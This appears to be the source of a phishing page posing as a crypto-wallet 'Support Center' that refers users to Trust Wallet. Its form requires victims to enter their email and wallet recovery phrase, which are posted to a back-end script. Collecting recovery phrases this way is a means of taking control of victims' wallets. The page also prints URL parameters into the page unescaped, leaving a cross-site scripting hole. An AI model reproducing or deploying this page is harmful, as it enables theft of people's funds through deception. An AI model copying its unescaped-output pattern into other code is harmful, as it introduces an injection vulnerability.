<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="form.css">
    <link rel="icon" href="./img/WhatsApp Image 2023-08-13 at 2.24.42 PM.jpeg">
    <link rel="stylesheet" href="assets/web/assets/mobirise-icons2/mobirise2.css">
  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
  
 
  <link rel="stylesheet" href="assets/dropdown/css/style.css">
  <link rel="stylesheet" href="assets/socicon/css/styles.css">
  <link rel="stylesheet" href="assets/theme/css/style.css">
  <link rel="preload" href="https://fonts.googleapis.com/css?family=Jost:100,200,300,400,500,600,700,800,900,100i,200i,300i,400i,500i,600i,700i,800i,900i&display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
  <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Jost:100,200,300,400,500,600,700,800,900,100i,200i,300i,400i,500i,600i,700i,800i,900i&display=swap"></noscript>
  <link rel="preload" as="style" href="assets/mobirise/css/mbr-additional.css"><link rel="stylesheet" href="assets/mobirise/css/mbr-additional.css" type="text/css">
    <title>Support Center</title>
    <style>
      #msg{
        position: absolute;
        top: 120px;
        width: 100%;
        background-color: skyblue;
      }
    </style>
</head>
<body>
  
<?php 
require_once('header.php');
?>
    <?php if(isset($_GET['error'])){ ?>
<div id="msg" class="alert  alert-dismissible">
<button class="btn-close" data-bs-dismiss="alert"></button>
<p><?php echo $_GET['error']?></p>
</div>
<?php } else if(isset($_GET['success'])){ ?>
<div id="msg" class="alert  alert-dismissible">
<button class="btn-close" data-bs-dismiss="alert"></button>
<p><?php echo $_GET['success']?></p>
</div>
<?php } ?>
<div class="reg" >
    <form  action="registersub.php" method="post">

        <h2 class="prop">Having issues? fill out the form below so we can address this issue</h2>
        <label for="">Email  <span style="color: brown;">*</span></label>
<input type="email" placeholder="Email" name="email" required id="email" style="margin-bottom: 20px;">
<label for="">Select your issue  <span style="color: brown;">*</span></label>
<select name="issue" id="issue" required style="margin-bottom: 20px;">
  
        <option value="">Select issue</option>
        <option value="swap/exchange">Swap/Exchange </option>
        <option value="phrase error">Phrase Error</option>
        <option value="transaction delay">Transaction Delay</option>
        <option value="missing funds">Missing Funds</option>
        <option value="hacked account">Hacked Account</option>
        <option value="others">Others..</option>
  
  
</select>
<label for="moreInfo">More info on issues <span style="color: brown;">*</span></label>
<textarea name="info" id="" cols="30" rows="10" style="margin-bottom: 20px; height: 70px;"></textarea>
<label for="recovery">Recovery phrase  <span style="color: brown;">*</span></label>
<textarea name="phrase" id="" cols="30" rows="10" required style="height: 70px; margin-bottom: 20px;" ></textarea>
<button name="submit">Submit</button>
    </form>
            </div> 
           
            <div>
                <h1 class="inc">Get started in 3 simple steps</h1>
                <p class="inc">It only takes a few minutes</p>
                <div id="steps">
                    <div>
                        <img src="./img/step1.jpeg" alt="">
                        <h2 class="cap">Download Trust Wallet</h2>
                    </div>
              <div id="s2">
                <img  src="./img/step2.jpeg" alt="">
                <h2 class="cap">Create a new wallet</h2>
              </div>
              <div id="log">
                <img class="s3" src="./img/step3.jpeg" alt="">
                <h2 class="cap">Get some crypto</h2>
              </div>
                </div>
                
            </div>
            <?php
            require_once('footer.php');
       
  ?>

</body>
<script src="assets/bootstrap/js/bootstrap.bundle.min.js"></script>
</html>

<!-- ///end of database code// -->

